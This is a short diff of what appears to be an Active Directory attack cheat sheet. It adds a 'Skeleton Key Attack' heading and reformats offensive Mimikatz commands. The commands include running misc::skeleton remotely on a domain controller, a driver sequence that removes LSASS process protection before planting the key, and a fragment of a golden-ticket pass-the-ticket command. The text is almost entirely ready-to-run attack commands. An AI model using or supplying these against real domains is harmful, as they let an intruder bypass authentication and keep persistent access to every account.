@@ -241,17 +241,16 @@ id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 #### Misc Attacks
+Skeleton Key Attack:-
 ```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```
+
 May require Kernel Driverload onto the host if process protected:-
+
 ```
 privilege::debug
-
 !+
-
 !processprotect /process:lsass.exe /remove
-
 misc::skeleton
-
 !-
 ```
  
